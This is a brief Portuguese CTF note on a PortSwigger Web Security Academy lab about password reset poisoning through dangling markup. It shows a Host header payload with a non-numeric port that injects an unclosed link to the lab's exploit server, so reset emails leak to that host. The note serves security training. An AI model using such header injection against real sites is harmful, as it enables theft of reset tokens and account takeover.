#ctf 

https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

O teste que deu certo neste caso é enviar uma porta não numérica. E ao analisar o email recebido é possível ver que ela aparece na tag `<a>`.

![[Pasted image 20240122170127.png]]

A ideia então é inserir o payload ali

```
Host: 0a6200b704016990819fb6ed002400f1.web-security-academy.net:'<a href="//exploit-0a98008f047e69f881c2b5fd0133004f.exploit-server.net/?
```
